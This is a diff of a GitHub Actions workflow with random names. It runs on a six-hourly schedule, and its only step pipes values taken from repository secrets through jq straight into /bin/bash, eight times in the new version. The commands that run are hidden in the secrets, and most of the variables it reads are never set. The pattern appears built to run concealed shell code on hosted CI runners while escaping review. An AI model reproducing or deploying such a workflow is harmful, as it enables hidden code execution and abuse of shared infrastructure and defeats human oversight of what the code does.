@@ -3,35 +3,22 @@ name: peixiayu6537
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 4/6 * * *'
-jobs:  # 20866
+    - cron: '28 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: peixiayu6537
         env:
-          ur652: ${{ secrets.ur652 }}
+          dm5769: ${{ secrets.dm5769 }}
         run: |
-          echo $ur652 | jq -r .oixt741 | /bin/bash
-          echo $jh59 | jq -r .ko340 | /bin/bash
-          echo $gpb680 | jq -r .k5300 | /bin/bash
-          echo $eqwtl3 | jq -r .rfxv4 | /bin/bash
-          echo $mv03484 | jq -r .izgaz847 | /bin/bash
-          echo $xasxg91 | jq -r .d9 | /bin/bash
-          echo $kq80 | jq -r .dkk34779 | /bin/bash
-          echo $k311 | jq -r .mw82 | /bin/bash
-          echo $dht3 | jq -r .g7782 | /bin/bash
-          echo $k58 | jq -r .lury9 | /bin/bash
-          echo $y64592 | jq -r .xgx70665 | /bin/bash
-          echo $i7025 | jq -r .oilt48618 | /bin/bash
-          echo $kqtav24718 | jq -r .wzphz21 | /bin/bash
-          echo $yrz741 | jq -r .rt3627 | /bin/bash
-          echo $za30 | jq -r .jalj095 | /bin/bash
-          echo $ygbo49827 | jq -r .iza35 | /bin/bash
-          echo $yju02 | jq -r .q75564 | /bin/bash
-          echo $drbe32722 | jq -r .hpxh873 | /bin/bash
-          echo $knr300 | jq -r .ibf4622 | /bin/bash
-          echo $t9 | jq -r .rkeg6 | /bin/bash
+          echo $dm5769 | jq -r .w1194 | /bin/bash
+          echo $xon20 | jq -r .s643 | /bin/bash
+          echo $mrxa12536 | jq -r .rubih799 | /bin/bash
+          echo $phxz2155 | jq -r .wt362 | /bin/bash
+          echo $c36 | jq -r .pmt62 | /bin/bash
+          echo $a9 | jq -r .ok09142 | /bin/bash
+          echo $t008 | jq -r .rdvz173 | /bin/bash
+          echo $hqnx8 | jq -r .l7 | /bin/bash
 
